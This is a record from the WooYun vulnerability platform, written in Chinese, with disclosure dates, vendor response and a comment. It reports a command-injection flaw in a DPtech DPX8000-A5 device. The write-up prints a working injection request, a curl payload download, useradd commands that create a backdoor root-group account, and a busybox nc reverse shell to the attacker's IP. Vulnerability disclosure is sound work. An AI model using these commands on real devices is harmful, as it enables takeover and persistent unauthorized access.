{"id": 2087, "wybug_id": "wooyun-2014-061235", "wybug_title": "DPtech DPX8000-A5 命令执行漏洞导致设备可被控制", "wybug_corp": "杭州迪普科技有限公司", "wybug_author": "Tea", "wybug_date": "2014-05-18 10:02", "wybug_open_date": "2014-08-16 10:04", "wybug_type": "设计不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-16：\t细节向公众公开  简要描述： 通过弱口令找到的例子，当独拿出来讲一下拿交互式SHELL的方法。大牛略过。。。 详细说明：  命令执行方法POC:http://10.X.X.73/func/web_main/display/net_tool/PingPOST:vrflist=0&ping_parameters=&ping_ip=0||ls -al ./\n\n设备开启了telnet,用默认登录用户可登录，但是终端却是预定义命令的环境，虽然也可以执行很多的功能了，但是不得到控制整个设备的权限还是不爽啊！\n\n查看设备信息：\n\n\n\n我开始的想法是写个WEBSHELL。。但是后面尝试了很久，不支持常见脚本，看了配置文件以后，就放弃了（貌似cgi脚本）。这条路死了。很多命令都被删除了，wget，幸亏还有Curl还能用。。写了个加用户的脚本丢上去，通过Curl去下载。curl -o z.sh http://xxx/z.sh加用户命令：\nuseradd -p \\$1\\$adminx\\$j.GPEDH1kTqGmwJOvdVVt0 -o -u 0 -g root -G root -s /bin/sh -d /home/adminx adminx\n其实后面知道了是不允许ROOT权限的用户直接远程登录的.(后面反弹shell看了下配置文件)死活登录不上。。后面：所以加了个：\nuseradd -p \\$1\\$adminx\\$j.GPEDH1kTqGmwJOvdVVt0 -o -u 1103 -g root -G root -s /bin/bash -d /home/adminx adminx\n\n\n然后去登录，依然是预定义命令的终端，改/bin/sh还是没用.然后这条路就也死了。后面看了下环境。无GCC,PYTHON,PERL。。。netcat也没得。。\n\n现在情况(你不能修改或者删除设备上的配置文件什么的):写SHELL太困难；用现有帐号或者新增帐号telnet登录（预定义终端）；很多工具都被阉割掉了，或者根本就一直没得；中间纠结了很久，也开了BT5然后找一些命令，尝试使用绝对路径去访问一些东西。。还想写个shell脚本，安装一些环境，或者安装个netcat，反弹个SHELL回来。当我在/bin下面看见了busybox的时候，突然感觉了一些希望，这玩意可以内置支持了不少工具。。运行看了下：\n\n发现里面支持nc.支持nc的话，我们就很大可能可以反弹SHELL。。执行看看。\n\n支持\"-e\"参数，这样感觉就简单了，测试了几次，拿到下面的姿势：\n/bin/busybox nc 10.10.10.10 2005 -e /bin/bash\n10.10.10.10是我的IP，2005是我监听的端口号。现在成功拿到了一个交互式的Shell(总算可以自己想干啥干啥)..\n\n   漏洞证明：  \n\n\n\n其实，主要就是一个姿势，在自己的BT5先测了可行：\n/bin/busybox nc 10.10.10.10 2005 -e /bin/bash\n   修复方案：  检查，过滤。   版权声明：转载请注明来源 Tea@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-05-23 09:57 厂商回复： CNVD未在实例上进行确认，已经先行将漏洞信息通报给杭州迪普科技有限公司安全响应中心。CNVD已经提取部分应用特征，待后续有条件(有认证条件)再进行通用性判定。目前根据设备固件特性进行认定。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-19 13:26 |    \t\tZ-0ne  \t\t\t( 普通白帽子  |\t\t\t        Rank:559 漏洞数:38        | 目前专注于工控安全基础研究，工业数据采集...)\t\t \n  mark 这批量起来肯定有点意思~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}